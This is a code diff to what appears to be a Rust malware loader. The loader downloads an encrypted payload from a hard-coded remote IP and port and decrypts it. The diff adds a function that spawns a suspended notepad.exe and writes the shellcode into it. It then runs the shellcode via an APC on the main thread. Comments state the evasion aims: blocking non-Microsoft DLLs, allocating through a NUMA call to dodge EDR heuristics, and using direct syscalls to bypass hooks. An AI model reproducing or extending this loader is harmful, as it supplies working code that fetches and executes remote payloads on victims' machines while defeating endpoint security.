@@ -19,6 +19,7 @@ const REMOTE_IP: &str = "10.10.14.16";
 const REMOTE_PORT: &str = "80";
 
 const FILE_PATH: &str = "s";
+const INJECTION_PROCESS: &str = "C:\\windows\\system32\\notepad.exe";
 
 fn main() {
     let args: Vec<String> = std::env::args().collect();
@@ -58,7 +59,7 @@ fn main() {
     let key = decode_hex::<32>(KEY_HEX);
     let encrypted_data = download_file(&remote_ip, &remote_port, FILE_PATH).unwrap();
     let data = decrypt_data(&key, encrypted_data);
-    unsafe { syscalls::inject(&data); }
+    inject_and_execute(data);
 }
 
 fn wait(duration: Duration) {
@@ -121,3 +122,81 @@ fn decrypt_data(key: &[u8; 32], data: Vec<u8>) -> Vec<u8> {
         .to_vec()
 }
 
+fn inject_and_execute(data: Vec<u8>) {
+    unsafe {
+        // Size the attribute list buffer for one attribute, then allocate and initialise it.
+        let mut attribute_size: usize = 0;
+        syscalls::InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut attribute_size);
+        let attr_buffer = syscalls::HeapAlloc(syscalls::GetProcessHeap(), syscalls::HEAP_ZERO_MEMORY, attribute_size);
+        syscalls::InitializeProcThreadAttributeList(attr_buffer, 1, 0, &mut attribute_size);
+
+        // Block non-Microsoft DLL injection into the spawned process.
+        let mut policy = syscalls::MITIGATION_BLOCK_NON_MICROSOFT;
+        syscalls::UpdateProcThreadAttribute(
+            attr_buffer,
+            0,
+            syscalls::PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+            &mut policy as *mut u64 as *mut _,
+            std::mem::size_of::<u64>(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+        );
+
+        let mut startup_info_ex: syscalls::STARTUPINFOEXA = std::mem::zeroed();
+        startup_info_ex.startup_info.cb = std::mem::size_of::<syscalls::STARTUPINFOEXA>() as u32;
+        startup_info_ex.lp_attribute_list = attr_buffer;
+
+        let mut process_information: syscalls::PROCESS_INFORMATION = std::mem::zeroed();
+
+        syscalls::CreateProcessA(
+            INJECTION_PROCESS.as_ptr(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            0,
+            syscalls::EXTENDED_STARTUPINFO_PRESENT | syscalls::CREATE_SUSPENDED | syscalls::CREATE_NO_WINDOW,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            &mut startup_info_ex.startup_info,
+            &mut process_information,
+        );
+
+        syscalls::HeapFree(syscalls::GetProcessHeap(), 0, attr_buffer);
+
+        // Allocate RW memory in the remote process.  NUMA node 0 keeps the allocation
+        // off the default VirtualAllocEx code path watched by some EDR heuristics.
+        let allocation_start = syscalls::VirtualAllocExNuma(
+            process_information.h_process,
+            std::ptr::null_mut(),
+            data.len(),
+            syscalls::MEM_COMMIT | syscalls::MEM_RESERVE,
+            syscalls::PAGE_READWRITE,
+            0,
+        );
+
+        // Write shellcode via direct syscall (bypasses hooks on NtWriteVirtualMemory).
+        syscalls::Sw3NtWriteVirtualMemory(
+            process_information.h_process,
+            allocation_start,
+            data.as_ptr() as *const _,
+            data.len(),
+            std::ptr::null_mut(),
+        );
+
+        // Flip protection to RX via direct syscall (bypasses hooks on NtProtectVirtualMemory).
+        let mut base = allocation_start;
+        let mut region_size = data.len();
+        let mut old_protect: u32 = 0;
+        syscalls::Sw3NtProtectVirtualMemory(
+            process_information.h_process,
+            &mut base,
+            &mut region_size,
+            syscalls::PAGE_EXECUTE_READ,
+            &mut old_protect,
+        );
+
+        // Queue shellcode as an APC on the suspended main thread; it fires on ResumeThread.
+        syscalls::QueueUserAPC(allocation_start, process_information.h_thread, 0);
+        syscalls::ResumeThread(process_information.h_thread);
+    }
+}
